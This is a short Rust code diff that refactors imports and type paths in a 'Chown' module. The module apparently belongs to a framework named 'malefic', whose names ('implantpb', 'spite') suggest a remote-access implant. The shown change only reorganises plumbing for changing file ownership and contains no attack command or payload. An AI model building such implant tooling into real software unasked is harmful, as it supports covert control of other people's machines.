@@ -1,8 +1,4 @@
-use crate::{check_field, check_request, Module, Result, TaskResult};
-use malefic_proto::proto::implantpb::spite::Body;
-
-use async_trait::async_trait;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 pub struct Chown {}
 
@@ -11,13 +7,13 @@ pub struct Chown {}
 impl Module for Chown {}
 
 #[async_trait]
-impl crate::ModuleImpl for Chown {
+impl malefic_proto::module::ModuleImpl for Chown {
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        _sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        _sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ChownRequest)?;
 
         // 检查 uid 和 gid 是否存在，并尝试将它们解析为 Uid 和 Gid
